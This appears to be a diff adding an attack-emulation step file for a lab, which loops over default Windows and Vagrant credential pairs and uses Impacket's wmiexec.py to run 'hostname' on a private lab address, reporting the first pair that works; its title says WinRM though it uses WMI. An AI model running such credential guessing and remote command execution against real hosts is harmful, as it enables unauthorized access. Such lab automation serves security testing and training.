@@ -1,0 +1,17 @@
+name: Bruteforce Winrm using defaults passwords wordlist
+steps:
+  - id: test_defaults
+    name: Test multiple default credentials
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          for cred in "vagrant:vagrant" "Administrator:vagrant" "Administrator:password" "Administrator:admin"; do
+            if python3 /usr/share/doc/python3-impacket/examples/wmiexec.py "$cred"@172.16.1.20 "hostname" 2>/dev/null | grep -qi "DESKTOP"; then
+              echo "VALID: $cred"
+              break
+            fi
+          done
+    output_var: valid_cred
+    on_fail: continue
